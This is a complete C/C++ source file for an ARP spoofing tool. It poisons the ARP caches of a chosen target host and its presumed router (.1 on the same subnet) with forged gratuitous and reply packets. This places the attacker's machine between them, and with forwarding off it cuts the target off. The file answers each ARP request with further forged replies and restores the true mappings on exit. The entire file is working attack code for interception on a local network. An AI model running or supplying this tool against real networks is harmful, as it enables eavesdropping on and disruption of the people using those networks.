#include <stdio.h>
#include <cstring>
#include <stdint.h>
#include <csignal>

#include <sys/socket.h> // socket
#include <poll.h> // poll
#include <linux/if_packet.h> // sockaddr_ll
#include <net/ethernet.h> // ETH_P_IP
#include <unistd.h> // close

#include <common.h>
#include <arp.h>

// Keyboard interrupt handler
int sigintFl = 0;
void sigintHandler(int signal){
    sigintFl = 1;
    printf("\n");
}

int main(int argc,char** argv){
    // sudo sysctl net.ipv4.ip_forward=0
    int retv = 0;
    if(argc < 3){
        printf("usage: sudo ./arpspf \"ifname\" \"target ip\"\n");
        return 1;
    }
    // Parse args
    char* ifname = argv[1];
    uint8_t targetIp[4] = {0};
    ip2arr(argv[2],targetIp);
    uint8_t routerIp[4] = {0};
    memcpy(routerIp,targetIp,3);
    routerIp[3] = 1;
    // Local adresses
    uint8_t localMac[6] = {0};
    uint8_t localIp[4] = {0};
    getInterfaceMac(ifname,localMac);
    getInterfaceIp(ifname,localIp);
    printf("Local ip: %d.%d.%d.%d\n",localIp[0],localIp[1],localIp[2],localIp[3]);
    printf("Local mac: %02x:%02x:%02x:%02x:%02x:%02x\n",localMac[0],localMac[1],localMac[2],localMac[3],localMac[4],localMac[5]);
    // Get router macaddress
    uint8_t routerMac[6] = {0};
    Arp_t arp;
    arp.getMac(ifname,routerIp,routerMac);
    printf("---------------------\n");
    printf("Router ip: %d.%d.%d.%d\n",routerIp[0],routerIp[1],routerIp[2],routerIp[3]);
    printf("Router mac: %02x:%02x:%02x:%02x:%02x:%02x\n",routerMac[0],routerMac[1],routerMac[2],routerMac[3],routerMac[4],routerMac[5]);
    // Get target mac address
    uint8_t targetMac[6] = {0};
    arp.restore();
    arp.getMac(ifname,targetIp,targetMac);
    printf("---------------------\n");
    printf("Target ip: %d.%d.%d.%d\n",targetIp[0],targetIp[1],targetIp[2],targetIp[3]);
    printf("Target mac: %02x:%02x:%02x:%02x:%02x:%02x\n",targetMac[0],targetMac[1],targetMac[2],targetMac[3],targetMac[4],targetMac[5]);
    // Socket for ARP spoofing
    int sockArp = socket(AF_PACKET,SOCK_DGRAM,htons(ETH_P_ARP));
    if(sockArp < 0){
        printf("Socket creation failed\n");
        return -1;
    }
    // Address for binding ARP socket
    sockaddr_ll bindAddr = {0};
    fillBindAddr(&bindAddr,ifname,ETH_P_ARP);
    retv = bind(sockArp,(sockaddr*)&bindAddr,sizeof(sockaddr_ll));
    // Router and target addresses
    sockaddr_ll routerAddr = {0};
    fillDestAddr(&routerAddr,ifname,routerMac,ETH_P_ARP);
    sockaddr_ll targetAddr = {0};
    fillDestAddr(&targetAddr,ifname,targetMac,ETH_P_ARP);
    // Prepare false ARP packets
    Arp_t targetArp;
    uint8_t broadcastMac[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
    *targetArp.oper = 1;
    memcpy(targetArp.spa,targetIp,ARP_PROTO_LEN);
    memcpy(targetArp.sha,localMac,ARP_HARDWARE_LEN);
    memcpy(targetArp.tpa,targetIp,ARP_PROTO_LEN);
    memcpy(targetArp.tha,broadcastMac,ARP_HARDWARE_LEN);
    Arp_t routerArp;
    *routerArp.oper = 1;
    memcpy(routerArp.spa,routerIp,ARP_PROTO_LEN);
    memcpy(routerArp.sha,localMac,ARP_HARDWARE_LEN);
    memcpy(routerArp.tpa,routerIp,ARP_PROTO_LEN);
    memcpy(routerArp.tha,broadcastMac,ARP_HARDWARE_LEN);
    // Start spoofing
    printf("ARP spoofing started...\n");
    Arp_t listenArp;
    pollfd fds[1];
    fds[0].fd = sockArp;
    fds[0].events = POLLIN;
    // Enable keyboard interrupt handler
    signal(SIGINT,sigintHandler);
    // Initial spoofing - send grat. ARP
    sendto(sockArp,targetArp.buffer,ARP_MSG_LEN,0,(sockaddr*)&routerAddr,sizeof(routerAddr));
    sendto(sockArp,routerArp.buffer,ARP_MSG_LEN,0,(sockaddr*)&targetAddr,sizeof(routerAddr));
    // Config packets to non grat. ARP
    *targetArp.oper = 2;
    memcpy(targetArp.tpa,routerIp,ARP_PROTO_LEN);
    memcpy(targetArp.tha,routerMac,ARP_HARDWARE_LEN);
    //
    *routerArp.oper = 2;
    memcpy(routerArp.tpa,targetIp,ARP_PROTO_LEN);
    memcpy(routerArp.tha,targetMac,ARP_HARDWARE_LEN);
    while(!sigintFl){
        retv = poll(fds,1,1000); // 1 s timeout
        if(retv < 0){
            printf("Socket poll error\n");
            break;
        }
        // ARP socket recieved data
        if(fds[0].revents & POLLIN){
            fds[0].revents = 0;
            recvfrom(sockArp,listenArp.buffer,ARP_MSG_LEN,0,NULL,NULL);
            uint8_t check = listenArp.check();
            if(check == 0){
                int targetCmp = memcmp(listenArp.spa,targetIp,ARP_PROTO_LEN);
                int routerCmp = memcmp(listenArp.spa,routerIp,ARP_PROTO_LEN);
                // ARP request from router
                if ((routerCmp == 0) and (*listenArp.oper == 1)){
                    sendto(sockArp,targetArp.buffer,ARP_MSG_LEN,0,(sockaddr*)&routerAddr,sizeof(routerAddr));
                    printf("Router spoofed\n");
                }
                // ARP request from target
                if ((targetCmp == 0) and (*listenArp.oper == 1)){
                    sendto(sockArp,routerArp.buffer,ARP_MSG_LEN,0,(sockaddr*)&targetAddr,sizeof(routerAddr));
                    printf("Target spoofed\n");
                }
            }
        }
    }
    // Create true ARP packets
    printf("ARP spoofing stopped, recovering ARP tables\n");
    // Create packets
    memcpy(targetArp.sha,targetMac,ARP_HARDWARE_LEN);
    memcpy(targetArp.spa,targetIp,ARP_PROTO_LEN);
    memcpy(targetArp.tha,broadcastMac,ARP_HARDWARE_LEN);
    memcpy(targetArp.tpa,targetIp,ARP_PROTO_LEN);
    //
    memcpy(routerArp.sha,routerMac,ARP_HARDWARE_LEN);
    memcpy(routerArp.spa,routerIp,ARP_PROTO_LEN);
    memcpy(routerArp.tha,broadcastMac,ARP_HARDWARE_LEN);
    memcpy(routerArp.tpa,routerIp,ARP_PROTO_LEN);
    // Send packets
    sendto(sockArp,routerArp.buffer,ARP_MSG_LEN,0,(sockaddr*)&targetAddr,sizeof(targetAddr));
    sendto(sockArp,targetArp.buffer,ARP_MSG_LEN,0,(sockaddr*)&routerAddr,sizeof(routerAddr));
    printf("ARP tables recovered\n");
    close(sockArp);
    return 0;
}